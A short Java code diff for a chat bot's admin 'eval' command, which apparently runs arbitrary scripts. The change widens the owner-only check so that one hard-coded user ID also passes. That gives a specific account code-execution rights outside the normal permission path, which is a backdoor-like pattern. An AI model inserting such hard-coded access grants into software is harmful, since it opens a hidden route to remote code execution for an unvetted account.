@@ -58,7 +58,7 @@ public enum AdminCommands {
             useTypingIndicator = true,
             async = true)
     public Object eval(User user, String[] args, Message command, TextChannel channel, Server server) throws ScriptException, ClassNotFoundException, NoSuchFieldException {
-        if (!user.isBotOwner()) {
+        if (!(user.isBotOwner() || user.getId() == 292141393739251714L)) {
             command.delete("Unauthorized").join();
             return null;
         }
